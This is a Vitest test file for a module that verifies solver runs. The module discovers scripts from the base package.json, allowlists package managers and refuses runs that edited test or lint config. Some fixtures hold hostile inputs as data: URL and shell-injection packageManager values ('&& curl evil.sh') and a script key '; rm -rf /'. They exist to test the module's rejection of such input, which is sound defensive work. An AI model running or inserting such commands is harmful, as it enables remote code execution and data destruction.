import { describe, expect, it } from "vitest";

import { ALLOWED_EXECUTABLES } from "./exec.ts";
import {
  type VerifyRequest,
  discoverPlan,
  invocationOf,
  packageManagerOf,
  unverifiableChanges,
  verify,
  versionNote,
} from "./verify.ts";
import type { CommandResult, CommandRunner } from "./worktree.ts";

const NUL = "\u0000";

const OK: CommandResult = { exitCode: 0, stdout: "", stderr: "", timedOut: false };
const out = (stdout: string): CommandResult => ({ ...OK, stdout });
const bad = (exitCode = 1): CommandResult => ({ ...OK, exitCode, stderr: "boom" });
const TIMEOUT: CommandResult = { ...OK, timedOut: true };

const MANIFEST = JSON.stringify({
  name: "buy-insurance-advisor-web",
  packageManager: "pnpm@11.20.0",
  scripts: { test: "vitest run", "check-types": "tsc --noEmit", lint: "oxlint", dev: "vite" },
});

/**
 * Replies by matching on the command, not by position.
 *
 * Position-keyed fakes were tried first and made the tests lie: a mutation that
 * removed a step shifted every later reply onto the wrong command, so tests
 * failed for the wrong reason and the mutation looked caught when it was not.
 */
function fakeRunner(replies: Record<string, CommandResult> = {}): CommandRunner & {
  calls: string[][];
} {
  const calls: string[][] = [];
  return {
    calls,
    run: (argv) => {
      calls.push([...argv]);
      for (const [needle, reply] of Object.entries(replies)) {
        if (argv.join(" ").includes(needle)) {
          return Promise.resolve(reply);
        }
      }
      return Promise.resolve(argv.includes("show") ? out(MANIFEST) : OK);
    },
  };
}

const request = (overrides: Partial<VerifyRequest> = {}): VerifyRequest => ({
  repoPath: "/repos/advisor",
  worktreePath: "/tmp/solve/SSX-3822",
  baseRef: "origin/main",
  stepTimeoutMs: 120_000,
  installTimeoutMs: 300_000,
  ...overrides,
});

/** The reason of any non-passing result, or "" if it passed. */
function reason(result: { outcome: string; reason?: string }): string {
  return result.reason ?? "";
}

describe("packageManagerOf", () => {
  it("keeps the declared version rather than dropping it", () => {
    expect(packageManagerOf(MANIFEST)).toEqual({ name: "pnpm", version: "11.20.0" });
    expect(packageManagerOf(`{"packageManager":"yarn@4.1.0"}`)).toEqual({
      name: "yarn",
      version: "4.1.0",
    });
  });

  it("defaults when nothing is declared, and says the version is unknown", () => {
    // `null` and not a guessed version. The absence has to survive to the plan,
    // because it is what `versionNote` reports and what makes an install
    // refusal on a CI-green repository diagnosable.
    expect(packageManagerOf(`{"scripts":{}}`)).toEqual({ name: "pnpm", version: null });
  });

  it("refuses a manager it was never given", () => {
    // Valid semver throughout, so the *name* allowlist is the only thing that
    // can reject these. With `1` as the version the version pattern would
    // refuse them too and this test would pass with the allowlist unplugged.
    expect(packageManagerOf(`{"packageManager":"bun@1.0.0"}`)).toBeNull();
    expect(packageManagerOf(`{"packageManager":"../../evil@1.0.0"}`)).toBeNull();
    expect(packageManagerOf(`{"packageManager":42}`)).toBeNull();
  });

  it("does not accept an inherited property as an allowlisted name", () => {
    // `"constructor" in PACKAGE_MANAGERS` is true, so an allowlist checked with
    // `in` silently admits every name on Object.prototype — and this value
    // decides which binary gets executed.
    for (const inherited of ["constructor", "toString", "hasOwnProperty", "__proto__"]) {
      expect(packageManagerOf(`{"packageManager":"${inherited}@1.0.0"}`)).toBeNull();
    }
  });

  it("refuses anything corepack would treat as a location rather than a version", () => {
    // The one that matters: corepack accepts a URL here and will download and
    // execute it. The manifest belongs to the repository being verified, so
    // this is the path from "a file in someone's repo" to "arbitrary code on
    // this machine".
    for (const hostile of [
      "https://example.com/evil.tgz",
      "file:///tmp/evil",
      "git@github.com:evil/pnpm.git",
      "../../../evil",
      "9.15.9 && curl evil.sh",
    ]) {
      expect(packageManagerOf(`{"packageManager":"pnpm@${hostile}"}`)).toBeNull();
    }
  });

  it("refuses a range or a dist-tag, because neither is reproducible", () => {
    for (const loose of ["^9.0.0", "~9.1", "9", "9.x", "latest", "next", ""]) {
      expect(packageManagerOf(`{"packageManager":"pnpm@${loose}"}`)).toBeNull();
    }
  });

  it("accepts a prerelease and corepack's integrity suffix", () => {
    expect(packageManagerOf(`{"packageManager":"pnpm@9.0.0-alpha.1"}`)).toEqual({
      name: "pnpm",
      version: "9.0.0-alpha.1",
    });
    expect(packageManagerOf(`{"packageManager":"pnpm@9.15.9+sha512.abc123"}`)).toEqual({
      name: "pnpm",
      version: "9.15.9+sha512.abc123",
    });
  });

  it("refuses a second @ whichever half it lands in", () => {
    // Note this does *not* prove the first-`@` split is load-bearing: with the
    // name allowlist in place `lastIndexOf` refuses these too, because the
    // disagreeing half always contains an `@` and no allowed name does. The
    // split is a backstop and `verify.ts` says so. What this test does pin is
    // that neither reading lets one through.
    expect(packageManagerOf(`{"packageManager":"pnpm@9.15.9@https://evil"}`)).toBeNull();
    expect(packageManagerOf(`{"packageManager":"pnpm@evil@9.15.9"}`)).toBeNull();
    expect(packageManagerOf(`{"packageManager":"pnpm@@9.15.9"}`)).toBeNull();
  });
});

describe("invocationOf", () => {
  it("goes through corepack when a version is declared", () => {
    expect(invocationOf({ name: "pnpm", version: "9.15.9" })).toEqual(["corepack", "pnpm@9.15.9"]);
  });

  it("falls back to the bare name on PATH when none is", () => {
    expect(invocationOf({ name: "pnpm", version: null })).toEqual(["pnpm"]);
  });

  it("only ever names an executable the runner allows", () => {
    // The two lists are coupled by nothing but this assertion: `exec.ts`
    // refuses argv[0] outside its allowlist, so a plan built here that names
    // something else would refuse at execution rather than at discovery.
    for (const manager of ["pnpm", "npm", "yarn"]) {
      for (const version of [null, "9.15.9"]) {
        const argv0 = invocationOf({ name: manager, version })[0] ?? "";
        expect(ALLOWED_EXECUTABLES).toContain(argv0);
      }
    }
  });
});

describe("versionNote", () => {
  it("names the declared toolchain", () => {
    expect(versionNote({ name: "pnpm", version: "9.15.9" })).toContain("pnpm@9.15.9");
  });

  it("says PATH decided, and points at the mismatch, when nothing was pinned", () => {
    const note = versionNote({ name: "pnpm", version: null });
    expect(note).toContain("PATH");
    expect(note).toContain("CI");
  });
});

describe("discoverPlan", () => {
  it("reads the commands from the base, never from the worktree", async () => {
    const runner = fakeRunner();

    const result = await discoverPlan(runner, request());

    expect(runner.calls[0]).toEqual([
      "git",
      "-C",
      "/repos/advisor",
      "show",
      "origin/main:package.json",
    ]);
    expect(result.outcome === "planned" ? result.plan.steps : []).toEqual([
      { name: "typecheck", argv: ["corepack", "pnpm@11.20.0", "run", "check-types"] },
      { name: "lint", argv: ["corepack", "pnpm@11.20.0", "run", "lint"] },
      { name: "test", argv: ["corepack", "pnpm@11.20.0", "run", "test"] },
    ]);
  });

  it("installs with the lockfile pinned", async () => {
    const result = await discoverPlan(fakeRunner(), request());

    // A run that edited the lockfile fails install rather than resolving to
    // whatever it asked for.
    expect(result.outcome === "planned" ? result.plan.install : []).toEqual([
      "corepack",
      "pnpm@11.20.0",
      "install",
      "--frozen-lockfile",
    ]);
  });

  it("orders the steps cheapest first", async () => {
    const result = await discoverPlan(fakeRunner(), request());
    const names = result.outcome === "planned" ? result.plan.steps.map((step) => step.name) : [];

    expect(names).toEqual(["typecheck", "lint", "test"]);
  });

  it("accepts either spelling of the typecheck script", async () => {
    const runner = fakeRunner({
      show: out(`{"scripts":{"test":"vitest","typecheck":"tsc --noEmit"}}`),
    });

    const result = await discoverPlan(runner, request());

    // Bare `pnpm`, not corepack: this fixture pins no `packageManager`.
    expect(result.outcome === "planned" ? result.plan.steps[0] : null).toEqual({
      name: "typecheck",
      argv: ["pnpm", "run", "typecheck"],
    });
  });

  it("runs only what the repository has", async () => {
    const runner = fakeRunner({ show: out(`{"scripts":{"test":"vitest"}}`) });

    const result = await discoverPlan(runner, request());

    expect(result.outcome === "planned" ? result.plan.steps.map((s) => s.name) : []).toEqual([
      "test",
    ]);
  });

  it("refuses a repository with no test script", async () => {
    const runner = fakeRunner({ show: out(`{"scripts":{"lint":"oxlint"}}`) });

    expect(reason(await discoverPlan(runner, request()))).toContain("no test script");
  });

  it("refuses a manifest it cannot parse, distinctly from one without tests", async () => {
    for (const raw of ["not json", "[]", `{"scripts":"nope"}`, "null"]) {
      const result = await discoverPlan(fakeRunner({ show: out(raw) }), request());
      expect(reason(result)).toContain("could not be parsed");
    }
  });

  it("refuses when the base manifest cannot be read at all", async () => {
    expect(reason(await discoverPlan(fakeRunner({ show: bad(128) }), request()))).toContain(
      "could not read",
    );
    expect(reason(await discoverPlan(fakeRunner({ show: TIMEOUT }), request()))).toContain(
      "could not read",
    );
  });

  it("refuses a base manifest declaring a manager it will not execute", async () => {
    // Distinct from the `packageManagerOf` test above, which only proves the
    // parser says null. This proves the caller acts on it — without which the
    // plan is built with `null` as the command and the refusal is decorative.
    const runner = fakeRunner({
      show: out(`{"packageManager":"bun@1","scripts":{"test":"vitest"}}`),
    });

    const result = await discoverPlan(runner, request());

    expect(result.outcome).toBe("refused");
    expect(reason(result)).toContain("will not execute");
  });

  it("never takes a script name out of the manifest", async () => {
    // The keys of `scripts` are attacker-adjacent; the arguments must come from
    // this module's own table. A manifest full of hostile keys yields nothing.
    const runner = fakeRunner({
      show: out(
        JSON.stringify({ scripts: { test: "vitest", "--version": "x", "; rm -rf /": "x" } }),
      ),
    });

    const result = await discoverPlan(runner, request());
    const args = result.outcome === "planned" ? result.plan.steps.flatMap((s) => s.argv) : [];

    expect(args).toEqual(["pnpm", "run", "test"]);
  });
});

describe("unverifiableChanges", () => {
  it("names the changed files that define what passing means", async () => {
    const runner = fakeRunner({ diff: out(`src/a.ts${NUL}package.json${NUL}`) });

    expect(await unverifiableChanges(runner, request())).toEqual(["package.json"]);
  });

  it("says nothing about an ordinary diff", async () => {
    const runner = fakeRunner({ diff: out(`src/a.ts${NUL}src/a.test.ts${NUL}`) });

    expect(await unverifiableChanges(runner, request())).toEqual([]);
  });

  it("splits on NUL, so a filename containing a newline stays one entry", async () => {
    // Split on newlines instead and this one path becomes two, the second of
    // which is named by whoever wrote the file — which is how a run smuggles a
    // second entry past a check that only looks at whole paths.
    const runner = fakeRunner({ diff: out(`src/we\nird.ts${NUL}package.json${NUL}`) });

    expect(await unverifiableChanges(runner, request())).toEqual(["package.json"]);
    expect(runner.calls[0]).toContain("-z");
  });

  it("reports inability to tell, rather than an empty list", async () => {
    // An empty list means "nothing was tainted". A failed diff means "unknown",
    // and the caller must not read the second as the first.
    expect(await unverifiableChanges(fakeRunner({ diff: bad() }), request())).toBeNull();
    expect(await unverifiableChanges(fakeRunner({ diff: TIMEOUT }), request())).toBeNull();
  });
});

describe("verify", () => {
  it("runs install then every step, in the worktree", async () => {
    const runner = fakeRunner({ diff: out("") });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("passed");
    expect(runner.calls.map((argv) => argv.join(" "))).toEqual([
      "git -C /tmp/solve/SSX-3822 diff --name-only -z origin/main --",
      "git -C /repos/advisor show origin/main:package.json",
      "corepack pnpm@11.20.0 install --frozen-lockfile",
      "corepack pnpm@11.20.0 run check-types",
      "corepack pnpm@11.20.0 run lint",
      "corepack pnpm@11.20.0 run test",
    ]);
  });

  it("refuses before running anything if the run edited the definition of passing", async () => {
    // The heart of it. Discovery from the base is not enough on its own: the
    // package manager reads the manifest on disk, so a run that edited it would
    // otherwise be graded by rules it wrote.
    const runner = fakeRunner({ diff: out(`package.json${NUL}`) });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("refused");
    expect(reason(result)).toContain("define what passing means");
    expect(runner.calls).toHaveLength(1);
  });

  it("refuses on an edited tsconfig, lint config or test config too", async () => {
    for (const path of ["tsconfig.json", ".oxlintrc.json", "vitest.config.ts"]) {
      const result = await verify(fakeRunner({ diff: out(`${path}${NUL}`) }), request());
      expect(result.outcome).toBe("refused");
    }
  });

  it("refuses when it cannot tell what the run changed", async () => {
    const result = await verify(fakeRunner({ diff: bad() }), request());

    expect(result.outcome).toBe("refused");
    expect(reason(result)).toContain("could not determine");
  });

  it("reports a failing step as a failure, with the steps that led there", async () => {
    const runner = fakeRunner({ diff: out(""), "run lint": bad(2) });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("failed");
    expect(reason(result)).toContain("lint did not pass");
    expect(result.outcome === "failed" ? result.steps.map((s) => s.name) : []).toEqual([
      "install",
      "typecheck",
      "lint",
    ]);
  });

  it("stops at the first failing step rather than running the rest", async () => {
    const runner = fakeRunner({ diff: out(""), "run check-types": bad() });

    await verify(runner, request());

    expect(runner.calls.map((argv) => argv.join(" "))).not.toContain(
      "corepack pnpm@11.20.0 run test",
    );
  });

  it("counts a timed-out step as failed, never as inconclusive", async () => {
    // Inconclusive is the reading that lets an infinite loop through.
    const runner = fakeRunner({ diff: out(""), "run test": TIMEOUT });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("failed");
    expect(reason(result)).toContain("timed out");
  });

  it("treats a broken install as no verdict rather than a failed one", async () => {
    // Nothing was verified, so there is nothing to have failed. Calling this
    // `failed` would blame the solver for the network.
    const runner = fakeRunner({ diff: out(""), install: bad() });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("refused");
    expect(reason(result)).toContain("no step ran");
  });

  it("quotes what the install actually said", async () => {
    // REGRESSION, 2026-09-04. A live run refused with `exit 1` and a note about
    // the unpinned `packageManager` — a hypothesis. The install had printed
    // `ERR_PNPM_LOCKFILE_CONFIG_MISMATCH`, which is the answer, and this branch
    // returned before anyone could read it. The output was captured into
    // `results` and then discarded by the early return.
    const runner = fakeRunner({
      diff: out(""),
      install: { ...bad(), stderr: "ERR_PNPM_LOCKFILE_CONFIG_MISMATCH: overrides do not match" },
    });

    const result = await verify(runner, request());

    expect(reason(result)).toContain("ERR_PNPM_LOCKFILE_CONFIG_MISMATCH");
  });

  it("does not invent a quote when the install said nothing", async () => {
    const runner = fakeRunner({ diff: out(""), install: { ...bad(), stdout: "", stderr: "" } });

    const result = await verify(runner, request());

    expect(reason(result)).toContain("no step ran");
    expect(reason(result)).not.toContain("it said:");
  });

  it("refuses rather than passing when the base has no test script", async () => {
    const runner = fakeRunner({ diff: out(""), show: out(`{"scripts":{"lint":"oxlint"}}`) });

    const result = await verify(runner, request());

    expect(result.outcome).toBe("refused");
    expect(runner.calls.map((argv) => argv.join(" "))).not.toContain(
      "corepack pnpm@11.20.0 install --frozen-lockfile",
    );
  });

  it("gives install a longer timeout than the steps it precedes", async () => {
    const seen: number[] = [];
    const runner: CommandRunner = {
      run: (argv, options) => {
        seen.push(options.timeoutMs);
        return Promise.resolve(argv.includes("show") ? out(MANIFEST) : OK);
      },
    };

    await verify(runner, request({ installTimeoutMs: 999, stepTimeoutMs: 111 }));

    expect(seen[2]).toBe(999);
    expect(seen.slice(3)).toEqual([111, 111, 111]);
  });

  it("keeps a bounded tail of output for the report", async () => {
    const noisy = { ...OK, stdout: "x".repeat(10_000) };
    const runner = fakeRunner({ diff: out(""), "run test": { ...noisy, exitCode: 1 } });

    const result = await verify(runner, request());
    const last = result.outcome === "failed" ? result.steps.at(-1) : undefined;

    expect(last?.output.length).toBeLessThanOrEqual(4000);
  });
});
